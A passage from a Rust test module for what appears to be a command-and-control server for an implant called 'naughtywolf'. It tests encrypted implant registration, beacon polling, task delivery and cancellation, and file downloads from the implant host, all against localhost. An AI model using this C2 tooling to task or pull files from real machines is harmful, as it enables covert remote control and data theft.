        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
    }

    #[tokio::test]
    async fn task_acknowledgements_are_atomic_and_session_owned() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"ack-ownership", b"test");
        let sid_a = seed_poll_session(&repo, &key).await;
        let sid_b = seed_poll_session(&repo, &key).await;
        let owned = repo
            .enqueue_task(&sid_a.to_string(), "one", &serde_json::json!([]), 1_000)
            .await
            .unwrap();
        let foreign = repo
            .enqueue_task(&sid_b.to_string(), "two", &serde_json::json!([]), 1_000)
            .await
            .unwrap();
        repo.tasks_for_delivery(&sid_a.to_string()).await.unwrap();
        repo.tasks_for_delivery(&sid_b.to_string()).await.unwrap();

        let error = repo
            .acknowledge_tasks(
                &sid_a.to_string(),
                &[
                    Uuid::parse_str(&owned).unwrap(),
                    Uuid::parse_str(&foreign).unwrap(),
                ],
            )
            .await;
        assert!(matches!(error, Err(crate::error::AppError::NotFound)));
        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
            .bind(owned)
            .fetch_one(&repo.pool)
            .await
            .unwrap();
        assert_eq!(status, "delivered");
    }

    #[derive(Clone)]
    struct LossyPollState {
        repo: Repository,
        psk: Arc<Vec<u8>>,
        drop_delivery: Arc<AtomicBool>,
        delivery_dropped: Arc<AtomicBool>,
    }

    async fn lossy_checkin(
        State(state): State<LossyPollState>,
        body: axum::body::Bytes,
    ) -> Result<axum::body::Bytes, StatusCode> {
        let is_poll = std::str::from_utf8(&body)
            .ok()
            .and_then(Envelope::routing_id)
            .is_some();
        let response = process_sealed(&state.repo, &state.psk, &body, "http")
            .await
            .map_err(|error| error.status())?;
        if is_poll && state.drop_delivery.load(Ordering::SeqCst) {
            let delivered: i64 =
                sqlx::query_scalar("SELECT COUNT(*) FROM c2_tasks WHERE status = 'delivered'")
                    .fetch_one(&state.repo.pool)
                    .await
                    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
            if delivered > 0 {
                state.drop_delivery.store(false, Ordering::SeqCst);
                state.delivery_dropped.store(true, Ordering::SeqCst);
                return Err(StatusCode::BAD_GATEWAY);
            }
        }
        Ok(axum::body::Bytes::from(response))
    }

    #[derive(Clone)]
    struct TransferCancelPollState {
        repo: Repository,
        psk: Arc<Vec<u8>>,
        store: crate::callback_workspace::transfers::TransferStore,
        transfer_id: Arc<std::sync::Mutex<Option<String>>>,
        polls_released: Arc<AtomicBool>,
        poll_release: Arc<tokio::sync::Notify>,
        partial_paused: Arc<AtomicBool>,
        partial_reached: Arc<tokio::sync::Notify>,
        partial_release: Arc<tokio::sync::Notify>,
        terminal_paused: Arc<AtomicBool>,
        terminal_reached: Arc<tokio::sync::Notify>,
        terminal_release: Arc<tokio::sync::Notify>,
    }

    async fn transfer_cancel_checkin(
        State(state): State<TransferCancelPollState>,
        body: axum::body::Bytes,
    ) -> Result<axum::body::Bytes, StatusCode> {
        if std::str::from_utf8(&body)
            .ok()
            .and_then(Envelope::routing_id)
            .is_some()
        {
            while !state.polls_released.load(Ordering::SeqCst) {
                state.poll_release.notified().await;
            }
        }
        let response =
            process_sealed_with_store(&state.repo, &state.psk, &body, "http", Some(&state.store))
                .await
                .map_err(|error| error.status())?;
        let transfer_id = state.transfer_id.lock().unwrap().clone();
        if let Some(transfer_id) = transfer_id {
            let transfer = state
                .repo
                .file_transfer(&transfer_id)
                .await
                .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
                .ok_or(StatusCode::INTERNAL_SERVER_ERROR)?;
            if transfer.status == "active"
                && transfer.received_bytes > 0
                && transfer.received_bytes < transfer.expected_size.unwrap_or_default()
                && !state.partial_paused.swap(true, Ordering::SeqCst)
            {
                state.partial_reached.notify_one();
                state.partial_release.notified().await;
            }
            if transfer.status == "cancelled" && !state.terminal_paused.swap(true, Ordering::SeqCst)
            {
                state.terminal_reached.notify_one();
                state.terminal_release.notified().await;
            }
        }
        Ok(axum::body::Bytes::from(response))
    }

    #[tokio::test]
    async fn cancelled_download_result_cleans_partial_and_advances_repository_fifo() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        sqlx::query("INSERT INTO users (id, username, password_hash, role) VALUES ('transfer-cancel-operator', 'alice', 'x', 'operator')")
            .execute(&repo.pool)
            .await
            .unwrap();
        let psk = Arc::new(b"transfer-cancel-psk".to_vec());
        let directory = tempfile::tempdir().unwrap();
        let store = crate::callback_workspace::transfers::TransferStore::new(
            repo.clone(),
            directory.path(),
            16 * 1024,
        )
        .unwrap();
        let state = TransferCancelPollState {
            repo: repo.clone(),
            psk: psk.clone(),
            store: store.clone(),
            transfer_id: Arc::new(std::sync::Mutex::new(None)),
            polls_released: Arc::new(AtomicBool::new(false)),
            poll_release: Arc::new(tokio::sync::Notify::new()),
            partial_paused: Arc::new(AtomicBool::new(false)),
            partial_reached: Arc::new(tokio::sync::Notify::new()),
            partial_release: Arc::new(tokio::sync::Notify::new()),
            terminal_paused: Arc::new(AtomicBool::new(false)),
            terminal_reached: Arc::new(tokio::sync::Notify::new()),
            terminal_release: Arc::new(tokio::sync::Notify::new()),
        };
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let app = Router::new()
            .route("/c2/checkin", post(transfer_cancel_checkin))
            .with_state(state.clone());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        let runtime = Arc::new(BeaconRuntime::new(
            Profile {
                endpoint: format!("http://127.0.0.1:{port}"),
                interval: Duration::from_millis(50),
                jitter: Duration::ZERO,
                hostname: "transfer-cancel-host".into(),
                username: "tester".into(),
                os: "linux".into(),
                arch: "x86_64".into(),
                pid: 4243,
                addr: "127.0.0.1".into(),
            },
            psk.as_ref().clone(),
        ));
        let beacon_runtime = runtime.clone();
        let beacon = tokio::spawn(async move { beacon_runtime.run().await });
        let session_id = tokio::time::timeout(Duration::from_secs(5), async {
            loop {
                if let Some(id) = sqlx::query_scalar::<_, String>(
                    "SELECT id FROM callbacks WHERE host = 'transfer-cancel-host' LIMIT 1",
                )
                .fetch_optional(&repo.pool)
                .await
                .unwrap()
                {
                    break id;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("implant registration");

        let source_dir = tempfile::tempdir().unwrap();
        let first_source = source_dir.path().join("first-download.bin");
        let follower_source = source_dir.path().join("follower-download.bin");
        std::fs::write(&first_source, vec![0x41; 8192]).unwrap();
        std::fs::write(&follower_source, b"follower").unwrap();
        let first = store
            .queue_download(
                &session_id,
                first_source.to_str().unwrap(),
                Some(8192),
                None,
                "transfer-cancel-operator",
                "alice",
            )
            .await
            .unwrap();
        let follower = store
            .queue_download(
                &session_id,
                follower_source.to_str().unwrap(),
                Some(8),
                None,
                "transfer-cancel-operator",
                "alice",
            )
            .await
            .unwrap();
        sqlx::query(
            "UPDATE c2_file_transfers SET created_at = '2026-01-01T00:00:00.001Z' WHERE id = ?",
        )
        .bind(&first.id)
        .execute(&repo.pool)
        .await
        .unwrap();
        sqlx::query(
            "UPDATE c2_file_transfers SET created_at = '2026-01-01T00:00:00.002Z' WHERE id = ?",
        )
        .bind(&follower.id)
        .execute(&repo.pool)
        .await
        .unwrap();
        *state.transfer_id.lock().unwrap() = Some(first.id.clone());
        state.polls_released.store(true, Ordering::SeqCst);
        state.poll_release.notify_one();

        tokio::time::timeout(Duration::from_secs(5), state.partial_reached.notified())
            .await
            .expect("real partial download persisted");
        let partial = directory
            .path()
            .join("callback-transfers")
            .join(format!("{}.part", first.storage_key));
        let destination = directory
            .path()
            .join("callback-transfers")
            .join(&first.storage_key);
        assert!(partial.exists());
        assert!(!destination.exists());
        let partial_len = std::fs::metadata(&partial).unwrap().len();
        assert!(partial_len > 0 && partial_len < 8192);
        let task_id = first.task_id.as_deref().unwrap();
        assert!(matches!(
            repo.request_task_cancellation(
                &session_id,
                task_id,
                "transfer-cancel-operator",
                "alice",
            )
            .await
            .unwrap(),
            crate::db::models::TaskCancellation::Requested { .. }
        ));
        state.partial_release.notify_one();

        tokio::time::timeout(Duration::from_secs(5), state.terminal_reached.notified())
            .await
            .expect("cancelled terminal result persisted");
        let task_status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
            .bind(task_id)
            .fetch_one(&repo.pool)
            .await
            .unwrap();
        let transfer_status = repo.file_transfer(&first.id).await.unwrap().unwrap().status;
        let deliverable = repo.tasks_for_delivery(&session_id).await.unwrap();
        let first_absent = !deliverable.iter().any(|task| task.id == task_id);
        let follower_deliverable = deliverable
            .iter()
            .any(|task| Some(task.id.as_str()) == follower.task_id.as_deref());
        let partial_cleaned = !partial.exists();
        let unpublished = !destination.exists();

        state.terminal_release.notify_one();
        runtime.trigger_stop();
        let _ = tokio::time::timeout(Duration::from_secs(2), beacon).await;
        server.abort();
        let _ = server.await;

        assert_eq!(task_status, "cancelled");
        assert_eq!(transfer_status, "cancelled");
        assert!(first_absent);
        assert!(follower_deliverable);
        assert!(partial_cleaned, "cancelled transfer partial remained");
        assert!(unpublished, "cancelled transfer was published");
    }

    #[tokio::test]
    async fn lost_delivery_then_processing_cancel_terminates_implant_task_once() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let psk = Arc::new(b"lossy-cancel-psk".to_vec());
        let state = LossyPollState {
            repo: repo.clone(),
            psk: psk.clone(),
            drop_delivery: Arc::new(AtomicBool::new(false)),
            delivery_dropped: Arc::new(AtomicBool::new(false)),
        };
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let app = Router::new()
            .route("/c2/checkin", post(lossy_checkin))
            .with_state(state.clone());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        let runtime = Arc::new(BeaconRuntime::new(
            Profile {
                endpoint: format!("http://127.0.0.1:{port}"),
                interval: Duration::from_millis(50),
                jitter: Duration::ZERO,
                hostname: "lossy-cancel-host".into(),
                username: "tester".into(),
                os: "linux".into(),
                arch: "x86_64".into(),
                pid: 4242,
                addr: "127.0.0.1".into(),
            },
            psk.as_ref().clone(),
        ));
        let beacon_runtime = runtime.clone();
        let beacon = tokio::spawn(async move { beacon_runtime.run().await });

        let session_id = tokio::time::timeout(Duration::from_secs(5), async {
            loop {
                if let Some(id) = sqlx::query_scalar::<_, String>(
                    "SELECT id FROM callbacks WHERE host = 'lossy-cancel-host' LIMIT 1",
                )
                .fetch_optional(&repo.pool)
                .await
                .unwrap()
                {
                    break id;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("implant registration");

        state.drop_delivery.store(true, Ordering::SeqCst);
        let barrier_dir = tempfile::tempdir().unwrap();
        let started = barrier_dir.path().join("started");
        let finished = barrier_dir.path().join("finished");
        let (command, args) = lifecycle_command(&started, &finished);
        let victim = repo
            .enqueue_task(&session_id, &command, &args, 60_000)
            .await
            .unwrap();
        tokio::time::timeout(Duration::from_secs(5), async {
            while !state.delivery_dropped.load(Ordering::SeqCst) {
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("first delivery response was lost");

        tokio::time::timeout(Duration::from_secs(5), async {
            loop {
                let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
                    .bind(&victim)
                    .fetch_one(&repo.pool)
                    .await
                    .unwrap();
                if status == "processing" && started.exists() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("implant must acknowledge and start the real child before cancellation");

        let cancellation = repo
            .request_task_cancellation(&session_id, &victim, "operator-1", "alice")
            .await
            .unwrap();
        assert!(matches!(
            cancellation,
            crate::db::models::TaskCancellation::Requested { .. }
        ));

        tokio::time::timeout(Duration::from_secs(5), async {
            loop {
                let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
                    .bind(&victim)
                    .fetch_one(&repo.pool)
                    .await
                    .unwrap();
                if status == "cancelled" {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        })
        .await
        .expect("redelivered victim must be terminated by nw/killtask");

        let result: (bool, Vec<u8>, i64) =
            sqlx::query_as("SELECT ok, stderr, exit_code FROM c2_task_results WHERE task_id = ?")
                .bind(&victim)
                .fetch_one(&repo.pool)
                .await
                .unwrap();
        assert!(!result.0);
        assert_eq!(result.1, b"task cancelled");
        assert_eq!(result.2, -1);
        assert_eq!(terminal_audit_count(&repo, &victim).await, 1);

        tokio::time::sleep(Duration::from_secs(4)).await;
        assert!(
            !finished.exists(),
            "the already-started victim must not reach its post-wait side effect"
        );

        runtime.trigger_stop();
        let _ = beacon.await;
        server.abort();
    }

    #[tokio::test]
    async fn processing_cancellation_uses_one_killtask_and_one_terminal_outcome() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"cancel-processing", b"test");
        let sid = seed_poll_session(&repo, &key).await;
        let task_id = repo
            .enqueue_task(
                &sid.to_string(),
                "sleep",
                &serde_json::json!(["30"]),
                60_000,
            )
            .await
            .unwrap();
        repo.tasks_for_delivery(&sid.to_string()).await.unwrap();
        repo.acknowledge_tasks(&sid.to_string(), &[Uuid::parse_str(&task_id).unwrap()])
            .await
            .unwrap();

        let first = repo
            .request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
            .await
            .unwrap();
        let second = repo
            .request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
            .await
            .unwrap();
        assert_eq!(first, second);
        let crate::db::models::TaskCancellation::Requested { control_task_id } = first else {
            panic!("processing cancellation must queue nw/killtask");
        };
        let control: (String, serde_json::Value, Option<String>) =
            sqlx::query_as("SELECT command, args_json, parent_task_id FROM c2_tasks WHERE id = ?")
                .bind(control_task_id)
                .fetch_one(&repo.pool)
                .await
                .unwrap();
        assert_eq!(control.0, "nw/killtask");
        assert_eq!(control.1, serde_json::json!([task_id]));
        assert_eq!(control.2.as_deref(), Some(task_id.as_str()));

        assert!(
            repo.store_task_result_for_session(
                &sid.to_string(),
                &task_id,
                false,
                b"",
                b"task cancelled",
                -1,
            )
            .await
            .unwrap()
        );
        // A replayed result is acknowledged but must not create a second audit outcome.
        assert!(
            repo.store_task_result_for_session(
                &sid.to_string(),
                &task_id,
                false,
                b"",
                b"task cancelled",
                -1,
            )
            .await
            .unwrap()
        );
        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
            .bind(&task_id)
            .fetch_one(&repo.pool)
            .await
            .unwrap();
        assert_eq!(status, "cancelled");
        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
        let requests: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM c2_audit WHERE action = 'task_cancellation_requested' AND details = ?",
        )
        .bind(format!("task {task_id}"))
        .fetch_one(&repo.pool)
        .await
        .unwrap();
        assert_eq!(requests, 1);
    }

    #[tokio::test]
    async fn completion_wins_before_late_cancellation_request() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"completion-wins", b"test");
        let sid = seed_poll_session(&repo, &key).await;
        let task_id = repo
            .enqueue_task(
                &sid.to_string(),
                "printf",
                &serde_json::json!(["done"]),
                5_000,
            )
            .await
            .unwrap();
        repo.tasks_for_delivery(&sid.to_string()).await.unwrap();
        repo.acknowledge_tasks(&sid.to_string(), &[Uuid::parse_str(&task_id).unwrap()])
            .await
            .unwrap();
        repo.store_task_result_for_session(&sid.to_string(), &task_id, true, b"done", b"", 0)
            .await
            .unwrap();

        assert_eq!(
            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
                .await
                .unwrap(),
            crate::db::models::TaskCancellation::AlreadyTerminal
        );
        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
            .bind(&task_id)
            .fetch_one(&repo.pool)
            .await
            .unwrap();
        assert_eq!(status, "completed");
        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
        let killtasks: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM c2_tasks WHERE parent_task_id = ? AND command = 'nw/killtask'",
        )
        .bind(task_id)
        .fetch_one(&repo.pool)
        .await
        .unwrap();
        assert_eq!(killtasks, 0);
    }

    #[tokio::test]
    async fn register_then_poll_records_callback_in_db() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool: pool.clone() };
        let app = router(Arc::new(b"dev-psk-change-me".to_vec())).with_state(repo.clone());
        let psk_key = session_key(b"dev-psk-change-me");

        // Full forward-secret handshake: implant rolls ephemeral x25519 key.
        let implant_kp = crypto::KeyPair::generate();
        let reg = Register {
            hostname: "laptop".into(),
            username: "you".into(),
            os: "macos".into(),
            arch: "aarch64".into(),
            pid: 1234,
            addr: "127.0.0.1".into(),
            os_version: Some("macOS 15.0".into()),
            executable_path: Some("/opt/naughtywolf/nw-implant".into()),
            local_addr: Some("10.20.30.40".into()),
            implant_version: Some("0.1.0".into()),
            interval_ms: Some(20_000),
            jitter_ms: Some(2_000),
            capabilities: Some(nw_profile::control::CallbackCapabilities {
                process_browser: true,
                file_browser: true,
                file_transfer: true,
                task_ack: true,
            }),
            session_key: b64(&implant_kp.public_key()),
        };
        let reg_pt = serde_json::to_vec(&reg).unwrap();
        let env_ct = crypto::encrypt(&psk_key, 1, &reg_pt).unwrap();
        let env = Envelope::new(Kind::Register, 1, None, env_ct);
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/register")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        // Ack inner is encrypted with the PSK key.
        let ack: Envelope = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .map(|b| serde_json::from_slice(&b).unwrap())
            .unwrap();
        let ack_pt = crypto::decrypt(&psk_key, 2, &ack.encrypted).unwrap();
        let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        // Derive the shared session key as the implant would.
        let shared = implant_kp
            .shared_secret(&deb64(&ack_msg.server_pub).unwrap())
            .unwrap();
        let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(count, 1);
        let host: String = sqlx::query_scalar("SELECT host FROM callbacks WHERE id = ?")
            .bind(ack_msg.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(host, "laptop");
        let metadata: (Option<String>, Option<String>, Option<String>, Option<String>, Option<i64>, Option<i64>, String) =
            sqlx::query_as(
                "SELECT os_version, executable_path, local_addr, implant_version, interval_ms, jitter_ms, capabilities_json \
                 FROM callbacks WHERE id = ?",
            )
            .bind(ack_msg.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(metadata.0.as_deref(), Some("macOS 15.0"));
        assert_eq!(metadata.1.as_deref(), Some("/opt/naughtywolf/nw-implant"));
        assert_eq!(metadata.2.as_deref(), Some("10.20.30.40"));
        assert_eq!(metadata.3.as_deref(), Some("0.1.0"));
        assert_eq!(metadata.4, Some(20_000));
        assert_eq!(metadata.5, Some(2_000));
        assert!(metadata.6.contains("process_browser"));
        let session_addr: String = sqlx::query_scalar("SELECT addr FROM c2_sessions WHERE id = ?")
            .bind(ack_msg.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(session_addr, "10.20.30.40");

        let queued = repo
            .enqueue_task(
                &ack_msg.session_id.to_string(),
                "whoami",
                &serde_json::json!([]),
                5_000,
            )
            .await
            .unwrap();

        // Poll encrypted under the derived session key and verify the JSON
        // endpoint keeps the database UUID rather than inventing a wire id.
        let poll_pt = serde_json::to_vec(&PollRequest::default()).unwrap();
        let poll_ct = crypto::encrypt(&session_key, 2, &poll_pt).unwrap();
        let poll_env = Envelope::new(Kind::TaskResult, 2, Some(ack_msg.session_id), poll_ct);
        let resp2 = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/poll")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&poll_env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp2.status(), StatusCode::OK);
        let reply_env: Envelope = serde_json::from_slice(
            &axum::body::to_bytes(resp2.into_body(), usize::MAX)
                .await
                .unwrap(),
        )
        .unwrap();
        let reply_pt = crypto::decrypt(&session_key, reply_env.id, &reply_env.encrypted).unwrap();
        let reply: PollReply = serde_json::from_slice(&reply_pt).unwrap();
        assert_eq!(reply.tasks.len(), 1);
        assert_eq!(reply.tasks[0].id.to_string(), queued);

        let accepted = PollRequest {
            accepted_task_ids: vec![reply.tasks[0].id],
            results: vec![nw_profile::msgs::TaskResult {
                task_id: reply.tasks[0].id,
                ok: true,
                stdout: b"tester".to_vec(),
                stderr: Vec::new(),
                exit_code: 0,
            }],
            ..Default::default()
        };
        let accepted_ct =
            crypto::encrypt(&session_key, 4, &serde_json::to_vec(&accepted).unwrap()).unwrap();
        let accepted_env =
            Envelope::new(Kind::TaskResult, 4, Some(ack_msg.session_id), accepted_ct);
        let resp3 = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/poll")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&accepted_env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp3.status(), StatusCode::OK);
        let result_env: Envelope = serde_json::from_slice(
            &axum::body::to_bytes(resp3.into_body(), usize::MAX)
                .await
                .unwrap(),
        )
        .unwrap();
        let result_pt =
            crypto::decrypt(&session_key, result_env.id, &result_env.encrypted).unwrap();
        let result_reply: PollReply = serde_json::from_slice(&result_pt).unwrap();
        assert_eq!(result_reply.result_acks, vec![reply.tasks[0].id]);
        let task_state: (String, Option<String>) =
            sqlx::query_as("SELECT status, processing_at FROM c2_tasks WHERE id = ?")
                .bind(&queued)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(task_state.0, "completed");
        assert!(task_state.1.is_some());
        let still_one: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(still_one, 1);
    }

    #[tokio::test]
    async fn sealed_gsocket_round_trip_preserves_task_identity() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool: pool.clone() };
        let psk = b"gs-portal-psk";
        let psk_key = session_key(psk);

        let implant_kp = crypto::KeyPair::generate();
        let register = Register {
            hostname: "gs-lab".into(),
            username: "operator".into(),
            os: "linux".into(),
            arch: "x86_64".into(),
            pid: 4242,
            addr: "127.0.0.1".into(),
            os_version: None,
            executable_path: None,
            local_addr: None,
            implant_version: None,
            interval_ms: None,
            jitter_ms: None,
            capabilities: None,
            session_key: b64(&implant_kp.public_key()),
        };
        let register_ct =
            crypto::encrypt(&psk_key, 1, &serde_json::to_vec(&register).unwrap()).unwrap();
        let register_wire = Envelope::new(Kind::Register, 1, None, register_ct)
            .seal(&psk_key)
            .unwrap();
        let ack_wire = process_sealed(&repo, psk, register_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let ack_env = Envelope::open(&psk_key, std::str::from_utf8(&ack_wire).unwrap()).unwrap();
        let ack_pt = crypto::decrypt(&psk_key, ack_env.id, &ack_env.encrypted).unwrap();
        let ack: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        let protocol: String = sqlx::query_scalar("SELECT protocol FROM callbacks WHERE id = ?")
            .bind(ack.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(protocol, "gs");

        let shared = implant_kp
            .shared_secret(&deb64(&ack.server_pub).unwrap())
            .unwrap();
        let key = crypto::derive_key(&shared, crypto::SESSION_SALT);
        let queued = repo
            .enqueue_task(
                &ack.session_id.to_string(),
                "whoami",
                &serde_json::json!([]),
                5000,
            )
            .await
            .unwrap();
        let request = nw_profile::msgs::PollRequest::default();
        let poll_ct = crypto::encrypt(&key, 2, &serde_json::to_vec(&request).unwrap()).unwrap();
        let poll_wire = Envelope::new(Kind::TaskResult, 2, Some(ack.session_id), poll_ct)
            .seal(&key)
            .unwrap();
        let reply_wire = process_sealed(&repo, psk, poll_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let reply_env = Envelope::open(&key, std::str::from_utf8(&reply_wire).unwrap()).unwrap();
        let reply_pt = crypto::decrypt(&key, reply_env.id, &reply_env.encrypted).unwrap();
        let reply: nw_profile::msgs::PollReply = serde_json::from_slice(&reply_pt).unwrap();
        assert_eq!(reply.tasks.len(), 1);
        assert_eq!(reply.tasks[0].id.to_string(), queued);

        let completed = nw_profile::msgs::PollRequest {
            results: vec![nw_profile::msgs::TaskResult {
                task_id: reply.tasks[0].id,
                ok: true,
                stdout: b"lab-user".to_vec(),
                stderr: Vec::new(),
                exit_code: 0,
            }],
            ..Default::default()
        };
        let result_ct = crypto::encrypt(&key, 3, &serde_json::to_vec(&completed).unwrap()).unwrap();
        let result_wire = Envelope::new(Kind::TaskResult, 3, Some(ack.session_id), result_ct)
            .seal(&key)
            .unwrap();
        let result_reply_wire = process_sealed(&repo, psk, result_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let result_reply_env =
            Envelope::open(&key, std::str::from_utf8(&result_reply_wire).unwrap()).unwrap();
        let result_reply_pt =
            crypto::decrypt(&key, result_reply_env.id, &result_reply_env.encrypted).unwrap();
        let result_reply: PollReply = serde_json::from_slice(&result_reply_pt).unwrap();
        assert_eq!(result_reply.result_acks, vec![reply.tasks[0].id]);

        // Lost result acknowledgements cause a replay; storage and terminal
        // audit remain idempotent while the server acknowledges it again.
        let replay_ct = crypto::encrypt(&key, 4, &serde_json::to_vec(&completed).unwrap()).unwrap();
        let replay_wire = Envelope::new(Kind::TaskResult, 4, Some(ack.session_id), replay_ct)
            .seal(&key)
            .unwrap();
        let replay_reply_wire = process_sealed(&repo, psk, replay_wire.as_bytes(), "gs")
            .await
            .unwrap();
        let replay_reply_env =
            Envelope::open(&key, std::str::from_utf8(&replay_reply_wire).unwrap()).unwrap();
        let replay_reply_pt =
            crypto::decrypt(&key, replay_reply_env.id, &replay_reply_env.encrypted).unwrap();
        let replay_reply: PollReply = serde_json::from_slice(&replay_reply_pt).unwrap();
        assert_eq!(replay_reply.result_acks, vec![reply.tasks[0].id]);
        let output: Vec<u8> =
            sqlx::query_scalar("SELECT stdout FROM c2_task_results WHERE task_id = ?")
                .bind(&queued)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(output, b"lab-user");
        assert_eq!(terminal_audit_count(&repo, &queued).await, 1);
    }

    #[test]
    fn completed_task_payload_replays_persisted_output() {
        use base64::Engine;

        let task = crate::db::models::C2TaskWithResult {
            id: "task-1".into(),
            session_id: "session-1".into(),
            command: "ls".into(),
            args_json: serde_json::json!([]),
            status: "completed".into(),
            created_at: "2026-09-10T05:22:22Z".into(),
            processing_at: Some("2026-09-10T05:22:23Z".into()),
            completed_at: Some("2026-09-10T05:22:24Z".into()),
            result_output: Some(base64::engine::general_purpose::STANDARD.encode(b"one\ntwo\n")),
            result_ok: Some(true),
            result_exit_code: Some(0),
            result_stderr: Some(Vec::new()),
        };

        let payload = completed_task_payload(&task).unwrap();

        assert_eq!(payload["id"], "task-1");
        assert_eq!(payload["command"], "ls");
        assert_eq!(payload["status"], "completed");
        assert_eq!(payload["output"], "one\ntwo\n");
        assert_eq!(payload["exit_code"], 0);
    }
}
